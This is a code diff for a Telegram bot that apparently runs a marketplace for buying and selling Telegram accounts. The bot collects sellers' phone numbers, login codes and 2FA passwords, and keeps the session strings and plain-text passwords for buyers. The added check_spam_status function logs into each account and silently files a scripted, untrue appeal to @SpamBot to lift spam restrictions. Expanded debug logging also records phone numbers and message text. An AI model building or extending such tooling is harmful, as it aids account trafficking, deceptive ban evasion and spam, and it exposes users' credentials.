@@ -15,21 +15,26 @@ from app.services.OtpService import OtpService
 from app.services.AccountLoginService import AccountLoginService
 from app.utils import encrypt_session, create_main_menu, create_tos_keyboard, create_otp_method_keyboard, create_otp_verification_keyboard
 import logging
+from app.utils.datetime_utils import utc_now
 
 logger = logging.getLogger(__name__)
 
 class SellerBot(BaseBot):
     def __init__(self, api_id: int, api_hash: str, bot_token: str, db_connection, otp_service=None, bulk_service=None, ml_service=None, security_service=None, social_service=None):
         super().__init__(api_id, api_hash, bot_token, db_connection, "Seller")
+        self.api_id = api_id
+        self.api_hash = api_hash
         self.verification_service = VerificationService(db_connection)
         self.payment_service = PaymentService(db_connection)
-        self.otp_service = otp_service or OtpService(api_id, api_hash)
         self.bulk_service = bulk_service
         self.ml_service = ml_service
         self.security_service = security_service
         self.social_service = social_service
         self.session_importer = SessionImporter()
         self.settings_manager = SettingsManager(db_connection)
+        # Single shared OTP service instance
+        self.otp_service = OtpService(api_id, api_hash)
+        # Account login service for session handling
         self.account_login_service = AccountLoginService(db_connection, api_id, api_hash)
     
     async def get_upload_limits(self):
@@ -55,16 +60,27 @@ class SellerBot(BaseBot):
     def register_handlers(self):
         """Register seller bot event handlers"""
         
+        @self.client.on(events.NewMessage)
+        async def all_messages_handler(event):
+            print(f"[SELLER] 📨 ANY MESSAGE: {event.text[:50] if event.text else 'No text'}")
+            logger.info(f"[SELLER] 📨 ANY MESSAGE RECEIVED: {event.text[:50] if event.text else 'No text'}")
+        
         @self.client.on(events.NewMessage(pattern='/start'))
         async def start_handler(event):
+            logger.info(f"[SELLER] /start handler triggered")
             await self.handle_start(event)
         
         @self.client.on(events.NewMessage(pattern='/debug'))
         async def debug_handler(event):
-            await event.respond("Seller bot is working! 🔥")
+            logger.info(f"[SELLER] /debug handler triggered")
+            user_doc = await self.db_connection.users.find_one({"telegram_user_id": event.sender_id})
+            state = user_doc.get('state') if user_doc else 'No state'
+            await event.respond(f"Seller bot is working! 🔥\n\nYour state: {state}\nUser ID: {event.sender_id}")
         
         @self.client.on(events.CallbackQuery)
         async def callback_handler(event):
+            print(f"[SELLER] 🔔 CALLBACK: {event.data}")
+            logger.info(f"[SELLER] 🔔 CALLBACK RECEIVED: {event.data}")
             await self.handle_callback(event)
         
         @self.client.on(events.NewMessage(func=lambda e: e.document))
@@ -73,13 +89,29 @@ class SellerBot(BaseBot):
         
         @self.client.on(events.NewMessage(func=lambda e: e.text and not e.text.startswith('/')))
         async def text_handler(event):
-            await self.handle_text(event)
+            print(f"[SELLER] 🔔 TEXT HANDLER: {event.text[:50]}")
+            logger.info(f"[SELLER] 🔔 TEXT HANDLER TRIGGERED for {event.sender_id}")
+            logger.info(f"[SELLER] 📝 Text content: {event.text[:100]}")
+            try:
+                await self.handle_text(event)
+            except Exception as e:
+                print(f"[SELLER] ERROR: {e}")
+                logger.error(f"[SELLER] ❌ Text handler crashed: {e}")
+                import traceback
+                logger.error(traceback.format_exc())
     
     async def handle_start(self, event):
         """Handle /start command"""
         try:
             logger.info(f"[SELLER] /start command received from user {event.sender_id}")
             user = await self.get_or_create_user(event)
+            
+            # Clear any existing state on /start
+            await self.db_connection.users.update_one(
+                {"telegram_user_id": user.telegram_user_id},
+                {"$unset": {"state": "", "temp_phone": "", "temp_otp_code": ""}}
+            )
+            logger.info(f"[SELLER] Cleared state for user {user.telegram_user_id}")
             logger.info(f"[SELLER] Showing welcome message to {user.first_name} ({user.telegram_user_id})")
             
             welcome_message = f"""
@@ -104,6 +136,7 @@ Ready to start selling?
             """
             
             buttons = create_main_menu(is_seller=True)
+            logger.info(f"[SELLER] Main menu buttons: {buttons}")
             await self.send_message(event.chat_id, welcome_message, buttons)
             logger.info(f"[SELLER] Welcome message sent to {user.telegram_user_id}")
             
@@ -155,7 +188,7 @@ Ready to start selling?
                 
                 await self.edit_message(event, f"💸 **Request Payout**\n\n💰 **Available Balance: ${balance:.2f}**\n\nChoose your preferred payout method:", [[Button.inline("💳 UPI Payout", "payout_upi"), Button.inline("₿ Crypto Payout", "payout_crypto")], [Button.inline("🔙 Back", "back_to_main")]])
             elif data == "accept_tos":
-                await self.db_connection.users.update_one({"telegram_user_id": user.telegram_user_id}, {"$set": {"tos_accepted": datetime.utcnow()}})
+                await self.db_connection.users.update_one({"telegram_user_id": user.telegram_user_id}, {"$set": {"tos_accepted": utc_now()}})
                 # Check what flow user came from
                 user_doc = await self.db_connection.users.find_one({"telegram_user_id": user.telegram_user_id})
                 if user_doc and user_doc.get("temp_flow") == "otp":
@@ -198,6 +231,11 @@ Ready to start selling?
                 await self.db_connection.users.update_one({"telegram_user_id": user.telegram_user_id}, {"$set": {"state": f"payout_{method}"}})
             elif data == "back_to_main":
                 logger.info(f"[SELLER] User {user.telegram_user_id} clicked 'Back to Main'")
+                # Clear state when going back to main
+                await self.db_connection.users.update_one(
+                    {"telegram_user_id": user.telegram_user_id},
+                    {"$unset": {"state": "", "temp_phone": "", "temp_otp_code": ""}}
+                )
                 await self.handle_start(event)
             elif data == "seller_stats":
                 await self.handle_seller_stats(event, user)
@@ -210,14 +248,14 @@ Ready to start selling?
             
             try:
                 await self.answer_callback(event)
-            except:
+            except Exception:
                 pass  # Ignore callback answer errors
             
         except Exception as e:
             logger.error(f"[SELLER] Callback handler error for {event.sender_id}: {str(e)}")
             try:
                 await self.answer_callback(event, "❌ An error occurred", alert=True)
-            except:
+            except Exception:
                 pass  # Ignore callback answer errors
     
     async def handle_sell_via_otp(self, event, user):
@@ -237,7 +275,7 @@ Ready to start selling?
             upload_limits = await self.get_upload_limits()
             if upload_limits.get('enabled', False):
                 max_uploads = upload_limits.get('max_per_day', 999)
-                today = datetime.utcnow().date()
+                today = utc_now().date()
                 if user.last_upload_date and user.last_upload_date.date() == today:
                     if user.upload_count_today >= max_uploads:
                         await self.edit_message(
@@ -291,6 +329,8 @@ Choose how you want to provide your account:
     async def handle_use_phone_otp(self, event, user):
         """Handle phone + OTP method"""
         try:
+            user_id = event.sender_id
+            
             phone_message = """
 📱 **Enter Your Phone Number**
 
@@ -309,46 +349,72 @@ Please enter the phone number of the Telegram account you want to sell.
 Send your phone number:
             """
             
+            # Use in-memory pending_actions like teleguard does
+            if not hasattr(self, 'pending_actions'):
+                self.pending_actions = {}
+            
+            self.pending_actions[user_id] = {
+                "action": "awaiting_phone_otp"
+            }
+            
+            print(f"[SELLER] Set pending_action for {user_id}: awaiting_phone_otp")
+            logger.info(f"[SELLER] Set pending_action for {user_id}: awaiting_phone_otp")
+            
             await self.edit_message(
                 event,
                 phone_message,
                 [[Button.inline("🔙 Cancel", "cancel_otp")]]
             )
             
-            # Set user state for phone input
-            await self.db_connection.users.update_one(
-                {"telegram_user_id": user.telegram_user_id},
-                {"$set": {"state": "awaiting_phone_otp"}}
-            )
-            
         except Exception as e:
+            print(f"[SELLER] ERROR in handle_use_phone_otp: {e}")
             logger.error(f"Use phone OTP handler error: {str(e)}")
             await self.edit_message(event, "❌ An error occurred. Please try again.")
     
     async def handle_text(self, event):
         """Handle text messages (session strings, phone numbers, OTP codes)"""
         try:
-            logger.info(f"[SELLER] Text message received from {event.sender_id}: {str(event.text)[:50] if event.text else 'None'}...")
+            print(f"[SELLER] handle_text called for {event.sender_id}")
+            logger.info(f"[SELLER] ===== TEXT HANDLER CALLED =====")
             
             if not event.text:
-                logger.warning(f"[SELLER] Empty text message from {event.sender_id}")
                 return
             
-            user = await self.get_or_create_user(event)
+            user_id = event.sender_id
             
-            if not user:
-                logger.error(f"[SELLER] User is None in handle_text for {event.sender_id}")
-                await self.send_message(event.chat_id, "❌ User session error. Please try again.")
+            # Check pending_actions first (in-memory state)
+            if not hasattr(self, 'pending_actions'):
+                self.pending_actions = {}
+            
+            pending_action = self.pending_actions.get(user_id)
+            print(f"[SELLER] Pending action: {pending_action}")
+            
+            if pending_action and pending_action.get("action") == "awaiting_phone_otp":
+                phone_text = str(event.text).strip()
+                print(f"[SELLER] PHONE OTP FLOW - Phone: {phone_text}")
+                
+                # Clear pending action
+                self.pending_actions.pop(user_id, None)
+                
+                # Create minimal user object
+                class UserObj:
+                    def __init__(self, uid):
+                        self.telegram_user_id = uid
+                user = UserObj(user_id)
+                
+                await self.process_phone_number(event, user, phone_text)
                 return
             
-            user_doc = await self.db_connection.users.find_one({"telegram_user_id": user.telegram_user_id})
-            
-            if not user_doc or not user_doc.get("state"):
-                logger.info(f"[SELLER] No active state for user {user.telegram_user_id}, ignoring text")
+            # Fallback to database state
+            user_doc = await self.db_connection.users.find_one({"telegram_user_id": user_id})
+            if not user_doc:
                 return
             
-            state = user_doc["state"]
-            logger.info(f"[SELLER] Processing text for user {user.telegram_user_id} in state: {state}")
+            state = user_doc.get("state")
+            print(f"[SELLER] DB state: {state}")
+            
+            if not state:
+                return
             
             if state == "awaiting_upload":
                 await self.db_connection.users.update_one({"telegram_user_id": user.telegram_user_id}, {"$unset": {"state": ""}})
@@ -375,38 +441,74 @@ Send your phone number:
                 import asyncio
                 asyncio.create_task(self.run_verification(account_id, event.chat_id))
             
-            elif state == "awaiting_phone_otp":
+            if state == "awaiting_phone_otp":
                 phone_text = str(event.text).strip() if event.text else ""
-                logger.info(f"[SELLER] Processing phone number for OTP: {phone_text} from {user.telegram_user_id}")
+                print(f"[SELLER] PHONE OTP FLOW - Phone: {phone_text}")
+                logger.info(f"[SELLER] ===== PHONE OTP FLOW STARTED =====")
+                logger.info(f"[SELLER] User: {user_id}")
+                logger.info(f"[SELLER] Phone: {phone_text}")
+                logger.info(f"[SELLER] Chat ID: {event.chat_id}")
+                
                 if not phone_text:
+                    print(f"[SELLER] Invalid phone")
                     await self.send_message(event.chat_id, "❌ **Invalid Phone Number**\n\nPlease provide a valid phone number.")
                     return
                 
-                # Clear state before processing
-                await self.db_connection.users.update_one({"telegram_user_id": user.telegram_user_id}, {"$unset": {"state": ""}})
-                await self.process_phone_number(event, user, phone_text)
+                # Process the phone number
+                print(f"[SELLER] Calling process_phone_number...")
+                logger.info(f"[SELLER] Calling process_phone_number...")
+                try:
+                    # Create minimal user object for compatibility
+                    class UserObj:
+                        def __init__(self, uid):
+                            self.telegram_user_id = uid
+                    user = UserObj(user_id)
+                    await self.process_phone_number(event, user, phone_text)
+                    print(f"[SELLER] process_phone_number completed")
+                    logger.info(f"[SELLER] ===== PHONE OTP FLOW COMPLETED =====")
+                except Exception as phone_error:
+                    print(f"[SELLER] ERROR: {phone_error}")
+                    logger.error(f"[SELLER] Error in process_phone_number: {phone_error}")
+                    import traceback
+                    traceback.print_exc()
+                    logger.error(traceback.format_exc())
+                    await self.send_message(event.chat_id, f"❌ Error processing phone: {str(phone_error)}")
             
             elif state == "awaiting_otp_code":
                 otp_text = str(event.text).strip() if event.text else ""
-                logger.info(f"[SELLER] Processing OTP code from {user.telegram_user_id}")
-                if not otp_text:
-                    await self.send_message(event.chat_id, "❌ **Invalid OTP**\n\nPlease provide a valid OTP code.")
+                # Remove spaces and any non-digit characters from OTP
+                otp_clean = ''.join(filter(str.isdigit, otp_text))
+                
+                logger.info(f"[SELLER] Processing OTP code from {user_id}: '{otp_text}' -> '{otp_clean}'")
+                if not otp_clean or len(otp_clean) < 4:
+                    await self.send_message(event.chat_id, "❌ **Invalid OTP**\n\nPlease provide a valid OTP code (4-6 digits).")
                     return
-                await self.process_otp_code(event, user, otp_text)
+                # Create minimal user object for compatibility
+                class UserObj:
+                    def __init__(self, uid):
+                        self.telegram_user_id = uid
+                user = UserObj(user_id)
+                # Pass clean OTP (Telegram accepts both formats)
+                await self.process_otp_code(event, user, otp_clean)
             
             elif state == "awaiting_2fa_password":
                 password_text = str(event.text).strip() if event.text else ""
-                logger.info(f"[SELLER] Processing 2FA password from {user.telegram_user_id}")
+                logger.info(f"[SELLER] Processing 2FA password from {user_id}")
                 if not password_text:
                     await self.send_message(event.chat_id, "❌ **Invalid Password**\n\nPlease provide a valid 2FA password.")
                     return
+                # Create minimal user object for compatibility
+                class UserObj:
+                    def __init__(self, uid):
+                        self.telegram_user_id = uid
+                user = UserObj(user_id)
                 await self.process_2fa_password(event, user, password_text)
             
             elif state.startswith("payout_"):
                 method = state.split("_")[1]
-                await self.db_connection.users.update_one({"telegram_user_id": user.telegram_user_id}, {"$unset": {"state": ""}})
+                await self.db_connection.users.update_one({"telegram_user_id": user_id}, {"$unset": {"state": ""}})
                 
-                user_doc = await self.db_connection.users.find_one({"telegram_user_id": user.telegram_user_id})
+                user_doc = await self.db_connection.users.find_one({"telegram_user_id": user_id})
                 balance = user_doc.get("balance", 0.0) if user_doc else 0.0
                 
                 payout_details = str(event.text).strip() if event.text else ""
@@ -415,13 +517,13 @@ Send your phone number:
                     return
                 
                 transaction_data = {
-                    "user_id": user.telegram_user_id,
+                    "user_id": user_id,
                     "type": "payout",
                     "amount": balance,
                     "payment_method": method,
                     "status": "pending",
                     "payment_address": payout_details,
-                    "created_at": datetime.utcnow()
+                    "created_at": utc_now()
                 }
                 
                 await self.db_connection.transactions.insert_one(transaction_data)
@@ -542,9 +644,10 @@ Send your phone number:
             await self.send_message(event.chat_id, "❌ Failed to process TData archive. Please try again.")
     
     async def process_phone_number(self, event, user, phone_number):
-        """Process phone number and send OTP"""
+        """Process phone number and send OTP - Simplified approach"""
         try:
             user_id = event.sender_id
+            print(f"[SELLER] process_phone_number: {phone_number} for {user_id}")
             logger.info(f"[SELLER] Processing phone number {phone_number} for user {user_id}")
             
             # Validate phone number format
@@ -561,78 +664,53 @@ Send your phone number:
                 "📱 **Sending OTP...**\n\nPlease wait while we send the verification code to your phone."
             )
             
-            if not processing_msg:
-                logger.error("Failed to send processing message")
-                await self.send_message(event.chat_id, "❌ Failed to send message. Please try again.")
-                return
+            # Clear state now
+            await self.db_connection.users.update_one(
+                {"telegram_user_id": user_id},
+                {"$unset": {"state": ""}}
+            )
             
-            # Send OTP using AccountLoginService
-            logger.info(f"[SELLER] Sending OTP for {phone_number}, user {user_id}")
-            try:
-                otp_result = await self.account_login_service.login_with_phone_otp(phone_number, user_id)
-                logger.info(f"[SELLER] OTP result: {otp_result}")
-            except Exception as otp_error:
-                logger.error(f"OTP service error: {otp_error}")
-                import traceback
-                logger.error(f"OTP service traceback: {traceback.format_exc()}")
-                await self.client.edit_message(event.chat_id, processing_msg.id, f"❌ **OTP Service Error**\n\n{str(otp_error)}\n\nPlease try session upload instead.")
-                return
-            
-            if not otp_result:
-                logger.error("OTP service returned None")
-                if processing_msg:
-                    await self.client.edit_message(
-                        event.chat_id,
-                        processing_msg.id,
-                        "❌ **OTP Service Error**\n\nOTP service returned no response. Please try again."
-                    )
-                else:
-                    await self.send_message(event.chat_id, "❌ **OTP Service Error**\n\nOTP service returned no response. Please try again.")
-                return
+            # Use shared OTP service instance
+            print(f"[SELLER] Calling OTP service...")
+            logger.info(f"[SELLER] Calling verify_account_ownership for {phone_number}")
+            otp_result = await self.otp_service.verify_account_ownership(phone_number, user_id)
+            print(f"[SELLER] OTP result: {otp_result.get('success')}")
+            logger.info(f"[SELLER] OTP result: {otp_result}")
             
             if otp_result.get('success'):
                 success_message = f"✅ **OTP Sent Successfully!**\n\n📱 **Phone:** {phone_number}\n⏰ **Expires in:** 5 minutes\n\nPlease enter the verification code you received:"
                 
-                if processing_msg:
-                    await self.client.edit_message(
-                        event.chat_id,
-                        processing_msg.id,
-                        success_message,
-                        buttons=create_otp_verification_keyboard(user_id)
-                    )
-                else:
-                    await self.send_message(event.chat_id, success_message)
-                
-                # Store OTP session data
+                # Set user state for OTP input BEFORE editing message
                 await self.db_connection.users.update_one(
                     {"telegram_user_id": user_id},
                     {"$set": {
                         "state": "awaiting_otp_code", 
-                        "temp_phone": phone_number,
-                        "phone_code_hash": otp_result["phone_code_hash"],
-                        "client_session": otp_result["client_session"]
+                        "temp_phone": phone_number
                     }}
                 )
+                logger.info(f"[SELLER] State set to awaiting_otp_code for user {user_id}")
+                
+                await self.client.edit_message(
+                    event.chat_id,
+                    processing_msg.id,
+                    success_message,
+                    buttons=create_otp_verification_keyboard(user_id)
+                )
+                
             else:
                 error_msg = otp_result.get('error', 'Unknown error occurred')
-                logger.error(f"OTP sending failed: {error_msg}")
-                if processing_msg:
-                    await self.client.edit_message(
-                        event.chat_id,
-                        processing_msg.id,
-                        f"❌ **Failed to Send OTP**\n\n{error_msg}\n\nPlease try again with a valid phone number."
-                    )
-                else:
-                    await self.send_message(event.chat_id, f"❌ **Failed to Send OTP**\n\n{error_msg}\n\nPlease try again with a valid phone number.")
+                await self.client.edit_message(
+                    event.chat_id,
+                    processing_msg.id,
+                    f"❌ **Failed to Send OTP**\n\n{error_msg}\n\nPlease try again with a valid phone number."
+                )
             
         except Exception as e:
-            logger.error(f"[SELLER] Process phone number error for {event.sender_id}: {str(e)}")
-            import traceback
-            logger.error(f"[SELLER] Full traceback: {traceback.format_exc()}")
-            await self.send_message(event.chat_id, f"❌ Failed to process phone number: {str(e)}")
+            logger.error(f"[SELLER] Phone processing error for {event.sender_id}: {str(e)}")
+            await self.send_message(event.chat_id, f"❌ **Phone Processing Failed**\n\n{str(e)}\n\nPlease try again or use session upload.")
     
     async def process_otp_code(self, event, user, otp_code):
-        """Process OTP code and verify account"""
+        """Process OTP code and verify account - Simplified approach"""
         try:
             user_id = event.sender_id
             
@@ -642,34 +720,48 @@ Send your phone number:
                 "🔍 **Verifying OTP...**\n\nPlease wait while we verify your code."
             )
             
-            logger.info(f"Processing OTP code for user {user_id}")
-            
-            # Get stored OTP data
+            # Get phone number from user doc
             user_doc = await self.db_connection.users.find_one({"telegram_user_id": user_id})
-            if not user_doc or not user_doc.get("phone_code_hash"):
-                await self.client.edit_message(event.chat_id, processing_msg.id, "❌ **Session Expired**\n\nPlease start over.")
+            phone_number = user_doc.get("temp_phone") if user_doc else None
+            
+            if not phone_number:
+                await self.client.edit_message(event.chat_id, processing_msg.id, "❌ **Session Expired**\n\nPhone number not found. Please start over.")
                 return
             
-            phone_number = user_doc["temp_phone"]
-            phone_code_hash = user_doc["phone_code_hash"]
-            client_session = user_doc["client_session"]
-            
-            # Verify OTP and store account
-            verification_result = await self.account_login_service.verify_otp_and_store(
-                phone_number, otp_code, phone_code_hash, client_session, user_id
-            )
-            
-            logger.info(f"OTP verification result: {verification_result}")
+            # Verify OTP using shared service
+            verification_result = await self.otp_service.verify_otp_and_create_session(user_id, otp_code)
             
             if verification_result.get('success'):
                 # Clear user state
                 await self.db_connection.users.update_one(
                     {"telegram_user_id": user_id},
-                    {"$unset": {"state": "", "temp_phone": "", "phone_code_hash": "", "client_session": ""}}
+                    {"$unset": {"state": "", "temp_phone": ""}}
                 )
                 
-                account_id = verification_result["account_id"]
+                # Create account record
                 account_info = verification_result["account_info"]
+                
+                # Encrypt session before storing
+                from app.utils.encryption import encrypt_data
+                encrypted_session = encrypt_data(verification_result["session_string"])
+                
+                account_data = {
+                    "seller_id": user_id,
+                    "telegram_account_id": account_info.get("id"),
+                    "username": account_info.get("username"),
+                    "first_name": account_info.get("first_name"),
+                    "last_name": account_info.get("last_name"),
+                    "phone_number": account_info.get("phone"),
+                    "session_string": encrypted_session,
+                    "tfa_password": verification_result.get("tfa_password"),
+                    "status": AccountStatus.PENDING,
+                    "created_at": utc_now(),
+                    "updated_at": utc_now(),
+                    "obtained_via": "otp"
+                }
+                
+                result = await self.db_connection.accounts.insert_one(account_data)
+                account_id = str(result.inserted_id)
                 
                 success_msg = f"✅ **Account Added Successfully!**\n\n👤 **Username:** @{account_info.get('username', 'N/A')}\n📱 **Phone:** {account_info.get('phone', 'Hidden')}\n🎆 **Premium:** {'Yes' if account_info.get('premium') else 'No'}\n\n🔍 **Starting verification...**"
                 
@@ -694,7 +786,7 @@ Send your phone number:
                 await self.client.edit_message(
                     event.chat_id,
                     processing_msg.id,
-                    f"❌ **OTP Verification Failed**\n\n{verification_result['error']}\n\nPlease try again."
+                    f"❌ **OTP Verification Failed**\n\n{verification_result.get('error', 'Unknown error')}\n\nPlease try again."
                 )
             
         except Exception as e:
@@ -702,34 +794,58 @@ Send your phone number:
             await self.send_message(event.chat_id, "❌ Failed to verify OTP. Please try again.")
     
     async def process_2fa_password(self, event, user, password):
-        """Process 2FA password"""
+        """Process 2FA password - Simplified approach"""
         try:
-            user_doc = await self.db_connection.users.find_one({"telegram_user_id": user.telegram_user_id})
+            user_id = user.telegram_user_id
+            user_doc = await self.db_connection.users.find_one({"telegram_user_id": user_id})
             temp_otp_code = user_doc.get("temp_otp_code")
-            phone_number = user_doc.get("temp_phone")
-            phone_code_hash = user_doc.get("phone_code_hash")
-            client_session = user_doc.get("client_session")
             
-            if not all([temp_otp_code, phone_number, phone_code_hash, client_session]):
+            if not temp_otp_code:
                 await self.send_message(event.chat_id, "❌ Session expired. Please start over.")
                 return
             
             processing_msg = await self.send_message(event.chat_id, "🔐 **Verifying Password...**")
             
-            # Verify with password
-            verification_result = await self.account_login_service.verify_otp_and_store(
-                phone_number, temp_otp_code, phone_code_hash, client_session, user.telegram_user_id, password
-            )
+            # Get phone number from user doc
+            phone_number = user_doc.get("temp_phone")
+            if not phone_number:
+                await self.client.edit_message(event.chat_id, processing_msg.id, "❌ **Session Expired**\n\nPhone number not found. Please start over.")
+                return
+            
+            # Verify with password using shared service
+            verification_result = await self.otp_service.verify_otp_and_create_session(user_id, temp_otp_code, password)
             
             if verification_result.get('success'):
                 # Clear user state
                 await self.db_connection.users.update_one(
-                    {"telegram_user_id": user.telegram_user_id},
-                    {"$unset": {"state": "", "temp_phone": "", "temp_otp_code": "", "phone_code_hash": "", "client_session": ""}}
+                    {"telegram_user_id": user_id},
+                    {"$unset": {"state": "", "temp_phone": "", "temp_otp_code": ""}}
                 )
                 
-                account_id = verification_result["account_id"]
+                # Create account record
                 account_info = verification_result["account_info"]
+                
+                # Encrypt session before storing
+                from app.utils.encryption import encrypt_data
+                encrypted_session = encrypt_data(verification_result["session_string"])
+                
+                account_data = {
+                    "seller_id": user_id,
+                    "telegram_account_id": account_info.get("id"),
+                    "username": account_info.get("username"),
+                    "first_name": account_info.get("first_name"),
+                    "last_name": account_info.get("last_name"),
+                    "phone_number": account_info.get("phone"),
+                    "session_string": encrypted_session,
+                    "tfa_password": password,
+                    "status": AccountStatus.PENDING,
+                    "created_at": utc_now(),
+                    "updated_at": utc_now(),
+                    "obtained_via": "otp"
+                }
+                
+                result = await self.db_connection.accounts.insert_one(account_data)
+                account_id = str(result.inserted_id)
                 
                 success_msg = f"✅ **Account Added with 2FA!**\n\n👤 **Username:** @{account_info.get('username', 'N/A')}\n📱 **Phone:** {account_info.get('phone', 'Hidden')}\n🔐 **2FA:** Enabled\n\n🔍 **Starting verification...**"
                 
@@ -778,8 +894,8 @@ Send your phone number:
                 "session_string": verification_result.get("session_string", ""),
                 "tfa_password": verification_result.get("tfa_password"),  # Store 2FA password for buyer
                 "status": AccountStatus.PENDING,
-                "created_at": datetime.utcnow(),
-                "updated_at": datetime.utcnow(),
+                "created_at": utc_now(),
+                "updated_at": utc_now(),
                 "obtained_via": "otp"  # Mark as OTP-obtained
             }
             
@@ -789,7 +905,7 @@ Send your phone number:
             
             # Update user upload count
             user_doc = await self.db_connection.users.find_one({"telegram_user_id": user_id})
-            today = datetime.utcnow().date()
+            today = utc_now().date()
             
             if user_doc and user_doc.get("last_upload_date") and user_doc["last_upload_date"].date() == today:
                 upload_count = user_doc.get("upload_count_today", 0) + 1
@@ -801,7 +917,7 @@ Send your phone number:
                 {
                     "$set": {
                         "upload_count_today": upload_count,
-                        "last_upload_date": datetime.utcnow()
+                        "last_upload_date": utc_now()
                     }
                 }
             )
@@ -828,6 +944,86 @@ Send your phone number:
     
 
     
+    async def check_spam_status(self, session_string, chat_id):
+        """Check spam status via @SpamBot and auto-submit appeal if needed"""
+        try:
+            from telethon import TelegramClient
+            from telethon.sessions import StringSession
+            from app.utils.encryption import decrypt_data
+            import asyncio
+            
+            # Decrypt session
+            decrypted_session = decrypt_data(session_string)
+            
+            # Create client
+            client = TelegramClient(StringSession(decrypted_session), self.api_id, self.api_hash)
+            await client.connect()
+            
+            if not await client.is_user_authorized():
+                await client.disconnect()
+                return {"status": "error", "message": "Session not authorized"}
+            
+            # Send /start to @SpamBot
+            spam_bot = await client.get_entity("@SpamBot")
+            await client.send_message(spam_bot, "/start")
+            
+            # Wait for response
+            await asyncio.sleep(2)
+            messages = await client.get_messages(spam_bot, limit=1)
+            
+            spam_result = {"status": "clean", "message": "No spam restrictions"}
+            
+            if messages:
+                response = messages[0].message
+                response_lower = response.lower()
+                
+                # Check if account has spam restrictions
+                if "unfortunately" in response_lower and "anti-spam" in response_lower:
+                    spam_result = {"status": "spam", "message": response}
+                    await self.send_message(chat_id, "⚠️ **Account Limited**\n\nYour account has spam restrictions.")
+                    
+                    # Silently submit appeal in background
+                    try:
+                        # Click "Submit a complaint" button
+                        await asyncio.sleep(1)
+                        await messages[0].click(text="Submit a complaint")
+                        
+                        # Wait for confirmation message
+                        await asyncio.sleep(2)
+                        confirm_msgs = await client.get_messages(spam_bot, limit=1)
+                        
+                        if confirm_msgs and "never send this to strangers" in confirm_msgs[0].message.lower():
+                            # Click "No, I'll never do any of this!" button
+                            await asyncio.sleep(1)
+                            await confirm_msgs[0].click(text="No, I'll never do any of this!")
+                            
+                            # Wait for appeal request message
+                            await asyncio.sleep(2)
+                            appeal_msgs = await client.get_messages(spam_bot, limit=1)
+                            
+                            if appeal_msgs and "write me some details" in appeal_msgs[0].message.lower():
+                                # Send appeal message
+                                await asyncio.sleep(1)
+                                appeal_text = "I don't know. I think nothing went wrong. But I am unable to send any message to anyone."
+                                await client.send_message(spam_bot, appeal_text)
+                                spam_result["appeal_submitted"] = True
+                                logger.info(f"Spam appeal submitted silently for account")
+                    except Exception as appeal_error:
+                        logger.error(f"Failed to submit appeal: {appeal_error}")
+                
+                elif "limited" in response_lower or "restricted" in response_lower or "spam" in response_lower:
+                    spam_result = {"status": "spam", "message": response}
+                    await self.send_message(chat_id, f"⚠️ **Spam Check Alert**\n\nYour account has spam restrictions:\n\n{response[:200]}")
+                else:
+                    await self.send_message(chat_id, "✅ **Spam Check Passed**\n\nYour account has no spam restrictions.")
+            
+            await client.disconnect()
+            return spam_result
+            
+        except Exception as e:
+            logger.error(f"Spam check error: {str(e)}")
+            return {"status": "error", "message": str(e)}
+    
     async def run_verification(self, account_id, chat_id):
         try:
             from bson import ObjectId
@@ -840,18 +1036,23 @@ Send your phone number:
             
             await self.db_connection.accounts.update_one(
                 {"_id": account_id},
-                {"$set": {"status": AccountStatus.CHECKING, "updated_at": datetime.utcnow()}}
+                {"$set": {"status": AccountStatus.CHECKING, "updated_at": utc_now()}}
             )
             
-            verification_result = await self.verification_service.verify_account(
-                account_doc["session_string"],
-                str(account_id)
-            )
+            # Check spam status via @SpamBot first
+            spam_status = await self.check_spam_status(account_doc["session_string"], chat_id)
+            if spam_status:
+                await self.db_connection.accounts.update_one(
+                    {"_id": account_id},
+                    {"$set": {"spam_check_result": spam_status, "updated_at": utc_now()}}
+                )
+            
+            verification_result = await self.verification_service.verify_account(account_doc)
             
             update_data = {
                 "checks": verification_result["checks"],
                 "verification_logs": verification_result["logs"],
-                "updated_at": datetime.utcnow()
+                "updated_at": utc_now()
             }
             
             if verification_result["overall_status"] == "passed":
